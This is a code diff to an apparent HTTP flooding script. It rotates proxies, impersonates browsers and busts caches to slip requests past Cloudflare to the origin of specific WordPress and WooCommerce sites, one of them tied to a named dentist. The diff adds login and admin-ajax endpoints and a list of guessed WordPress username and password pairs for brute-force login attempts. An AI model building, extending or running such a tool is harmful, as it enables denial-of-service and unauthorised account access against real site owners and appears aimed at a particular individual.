@@ -28,6 +28,17 @@ PROFILES = [
     ("chrome107", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"),
 ]
 
+WP_LOGIN_POST_DATA = [
+    {"log": "admin",      "pwd": "password123",  "wp-submit": "Log In", "testcookie": "1"},
+    {"log": "admin",      "pwd": "admin123",     "wp-submit": "Log In", "testcookie": "1"},
+    {"log": "admin",      "pwd": "letmein",      "wp-submit": "Log In", "testcookie": "1"},
+    {"log": "todd",       "pwd": "todd1234",     "wp-submit": "Log In", "testcookie": "1"},
+    {"log": "webmaster",  "pwd": "webmaster",    "wp-submit": "Log In", "testcookie": "1"},
+    {"log": "admin",      "pwd": "wordpress",    "wp-submit": "Log In", "testcookie": "1"},
+]
+
+POST_ENDPOINTS = {}
+
 ENDPOINT_SETS = {
     "feed":    ["/feed/", "/comments/feed/"],
     "woo":     ["/?wc-ajax=get_refreshed_fragments",
@@ -51,7 +62,13 @@ ENDPOINT_SETS = {
                 "/?wc-ajax=update_order_review"],
     "shatkin_open": ["/feed/", "/comments/feed/", "/sitemap_index.xml",
                      "/page-sitemap.xml", "/category-sitemap.xml",
-                     "/dentist-todd-shatkins-history-of-stalking/"],
+                     "/dentist-todd-shatkins-history-of-stalking/",
+                     "/wp-login.php",
+                     "/wp-admin/admin-ajax.php",
+                     "/?p=1",
+                     "/page/2/", "/page/3/", "/page/4/", "/page/5/",
+                     "/page/6/", "/page/7/", "/page/8/", "/page/9/",
+                     "/page/10/", "/page/11/"],
     "buffalo": ["/", "/feed/", "/comments/feed/", "/sitemap_index.xml", "/sitemap.xml",
                 "/page-sitemap.xml", "/category-sitemap.xml", "/post-sitemap.xml",
                 "/wp-sitemap.xml", "/author/admin/", "/author/admin/feed/",
@@ -106,21 +123,31 @@ def next_proxy(single_proxy):
 def send_one(target, single_proxy, req_num):
     imp, ua = random.choice(PROFILES)
     path = random.choice(_endpoints)
-    sep = "&" if "?" in path else "?"
-    path = f"{path}{sep}_={int(time.time() * 1000) + random.randint(0, 999)}"
     url  = f"https://{target}{path}"
     p    = next_proxy(single_proxy)
     px   = {"http": p, "https": p} if p else None
     t0   = time.time()
     try:
-        r = cffi.get(url, headers={"User-Agent": ua},
-                     proxies=px, impersonate=imp, timeout=15)
+        hdrs = {"User-Agent": ua}
+        post_data = POST_ENDPOINTS.get(path)
+        if post_data:
+            r = cffi.post(url, headers=hdrs, data=post_data,
+                          proxies=px, impersonate=imp, timeout=15)
+            method_tag = "POST"
+        else:
+            sep = "&" if "?" in path else "?"
+            url = f"{url}{sep}_={int(time.time() * 1000) + random.randint(0, 999)}"
+            r = cffi.get(url, headers=hdrs,
+                         proxies=px, impersonate=imp, timeout=15)
+            method_tag = "GET"
+
         elapsed   = time.time() - t0
         status    = r.status_code
         mitigated = r.headers.get("cf-mitigated", "")
         cache     = r.headers.get("cf-cache-status", "?")
 
-        if status == 200 and not mitigated:
+        origin_hit = cache == "DYNAMIC" or (status in (200, 302, 301, 400) and not mitigated)
+        if origin_hit and not mitigated:
             color = G; tag = "PASS"
             with _lock: _stats["ok"] += 1
         elif mitigated or status in (403, 429):
@@ -131,7 +158,7 @@ def send_one(target, single_proxy, req_num):
             with _lock: _stats["err"] += 1
 
         with _lock: _stats["total"] += 1
-        print(f"  [{req_num:>3}] {color}{tag}{W}  {status}  cache={cache}  {elapsed:.2f}s  {imp}  {path}")
+        print(f"  [{req_num:>3}] {color}{tag}{W}  {status}  cache={cache}  {elapsed:.2f}s  {method_tag}  {imp}  {path}")
         return tag
     except Exception as e:
         elapsed = time.time() - t0
